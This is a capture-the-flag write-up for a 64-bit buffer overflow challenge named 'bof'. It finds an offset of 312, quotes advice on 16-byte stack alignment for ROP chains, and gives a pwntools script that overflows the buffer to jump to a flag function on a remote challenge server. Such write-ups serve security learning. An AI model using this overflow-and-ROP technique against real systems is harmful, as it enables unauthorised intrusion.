# bof

Buffer overflow

Find offset with gdb and cyclic -> 312

There is a flag function, which when called locally works, but remotely doesn't...it took me a while to figure out the reason.
```
If you're using Ubuntu 18.04 and segfaulting on a movaps instruction in buffered_vfprintf() or do_system() in the x86_64 challenges, then ensure the stack is 16-byte aligned before returning to GLIBC functions such as printf() or system(). The version of GLIBC packaged with Ubuntu 18.04 uses movaps instructions to move data onto the stack in some functions. The 64 bit calling convention requires the stack to be 16-byte aligned before a call instruction but this is easily violated during ROP chain execution, causing all further calls from that function to be made with a misaligned stack. movaps triggers a general protection fault when operating on unaligned data, so try padding your ROP chain with an extra ret before returning into a function or return further into a function to skip a push instruction.
Rop Emporium
```

```python
#!/usr/bin/python3

from pwn import *

debug = 0
context.bits = 64
context.arch = 'amd64'
context.endianness = 'little'

IP = '34.89.213.64'
port = 30383
offset = 312
padding = b'A'*offset

flag = pack(0x0000000000400767)
exit_plt = pack(0x0000000000400670)
ret = pack(0x00000000004005de)
payload = [padding, ret, flag, exit_plt, b'\0\0\0\0\0\0\0\0', b'\r\n']
payload = b''.join(payload)

def main():
    if debug == 0:
        #p = process('./bof')
        p = remote(IP, port)
        print(p.recvline().decode())
        p.sendline(payload)
        p.interactive()
    elif debug == 1:
        p = process('./bof')
        print(p.recvline().decode())
        p.sendline(payload)
        p.interactive()
    else:
        sys.stdout.buffer.write(payload)
if __name__ == "__main__":
    main()
```